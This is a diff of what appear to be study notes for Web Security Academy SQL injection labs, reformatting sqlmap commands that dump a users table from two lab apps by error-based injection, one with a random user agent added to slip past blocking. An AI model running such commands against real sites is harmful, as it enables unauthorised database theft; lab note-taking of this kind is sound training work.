@@ -30,17 +30,14 @@ There is a built-in table on Oracle called dual which you can use for this purpo
 
 #### App 1
 ```
-sqlmap -u 'https://...web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist='  -batch 
---dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'organize_by'
+sqlmap -u 'https://...web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'organize_by'
 ```
 #### App 2
 ```
-sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms 
-postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --> will get 
+sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --> will get 
 critical error, looks like something is blocking => add random agent options
 
-sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms 
-postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --random-agent
+sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --random-agent
 ```
 
 ## LABS payloads
